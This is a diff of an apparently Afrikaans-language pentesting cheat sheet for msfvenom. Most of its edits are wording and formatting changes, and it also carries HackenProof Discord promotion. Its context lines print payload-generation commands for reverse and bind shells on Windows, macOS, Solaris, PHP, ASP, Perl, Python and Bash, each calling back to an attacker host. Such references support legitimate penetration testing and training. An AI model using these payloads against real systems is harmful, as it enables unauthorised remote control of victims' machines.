@@ -22,8 +22,8 @@ Sluit aan by [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) be
 **Hacking Inligting**\
 Betrek met inhoud wat die opwinding en uitdagings van hacking ondersoek
 
-**Regte-Tyd Hack Nuus**\
-Bly op hoogte van die vinnige hacking wêreld deur regte-tyd nuus en insigte
+**Regte Tyd Hack Nuus**\
+Bly op hoogte van die vinnige hacking wêreld deur regte tyd nuus en insigte
 
 **Laaste Aankondigings**\
 Bly ingelig oor die nuutste bug bounties wat bekendgestel word en belangrike platform opdaterings
@@ -98,6 +98,8 @@ msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe > enco
 ```bash
 msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -x /usr/share/windows-binaries/plink.exe -f exe -o plinkmeter.exe
 ```
+{% endcode %}
+
 ## Linux Payloads
 
 ### Reverse Shell
@@ -131,7 +133,11 @@ msfvenom --platform=solaris --payload=solaris/x86/shell_reverse_tcp LHOST=(ATTAC
 ```bash
 msfvenom -p osx/x86/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f macho > reverse.macho
 ```
+{% endcode %}
+
 ### **Bind Shell**
+
+{% code overflow="wrap" %}
 ```bash
 msfvenom -p osx/x86/shell_bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f macho > bind.macho
 ```
@@ -152,7 +158,7 @@ cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> s
 
 ### ASP/x
 
-#### Terug shell
+#### Terugskakel
 
 {% code overflow="wrap" %}
 ```bash
@@ -197,6 +203,8 @@ msfvenom -p cmd/unix/reverse_perl LHOST=(IP Address) LPORT=(Your Port) -f raw > 
 ```bash
 msfvenom -p cmd/unix/reverse_python LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.py
 ```
+{% endcode %}
+
 ### **Bash**
 ```bash
 msfvenom -p cmd/unix/reverse_bash LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.sh
@@ -208,7 +216,7 @@ msfvenom -p cmd/unix/reverse_bash LHOST=<Local IP Address> LPORT=<Local Port> -f
 Sluit aan by [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) bediener om met ervare hackers en bug bounty jagters te kommunikeer!
 
 **Hacking Inligting**\
-Neem deel aan inhoud wat die opwinding en uitdagings van hacking ondersoek
+Betrek jouself met inhoud wat die opwinding en uitdagings van hacking ondersoek
 
 **Regte Tyd Hack Nuus**\
 Bly op hoogte van die vinnige hacking wêreld deur middel van regte tyd nuus en insigte
